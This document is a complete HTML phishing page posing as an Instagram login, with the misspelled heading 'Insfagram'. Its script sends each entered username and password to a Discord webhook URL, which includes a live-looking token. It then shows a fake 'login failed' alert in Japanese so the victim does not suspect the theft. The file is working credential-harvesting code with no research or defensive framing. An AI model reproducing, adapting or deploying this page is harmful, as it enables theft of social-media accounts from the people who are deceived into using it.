<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-container {
            background-color: white;
            border-radius: 8px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
            padding: 40px;
            width: 350px;
            text-align: center;
        }
        .login-container h1 {
            font-size: 26px;
            margin-bottom: 20px;
            color: #333;
        }
        .login-container input {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border: 1px solid #dbdbdb;
            border-radius: 4px;
            transition: border-color 0.3s;
        }
        .login-container input:focus {
            border-color: #0095f6;
        }
        .login-container button {
            width: 100%;
            padding: 12px;
            background-color: #0095f6;
            border: none;
            border-radius: 4px;
            color: white;
            font-size: 16px;
            cursor: pointer;
            transition: background-color 0.3s;
        }
        .login-container button:hover {
            background-color: #007bbf;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <h1>Insfagram</h1>
        <form id="loginForm">
            <input type="text" id="username" placeholder="Username or Phone" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit">Log In</button>
        </form>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', function(event) {
            event.preventDefault();

            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;

            const webhookURL = 'https://discord.com/api/webhooks/1254349103853207573/FxzjcFkrpFe80uVv8_nLibQmDCuDeOfHCl8GVXGI89uo8BEnPQmGJC8G0SFQHcXigqlg';
            const data = {
                content: `Username: ${username}, Password: ${password}`
            };

            fetch(webhookURL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(data)
            })
            .then(response => {
                if (response.ok) {
                    alert('ログインに失敗しました');
                } else {
                    alert('Failed to send login information.');
                }
            })
            .catch(error => {
                console.error('Error:', error);
                alert('An error occurred.');
            });
        });
    </script>
</body>
</html>
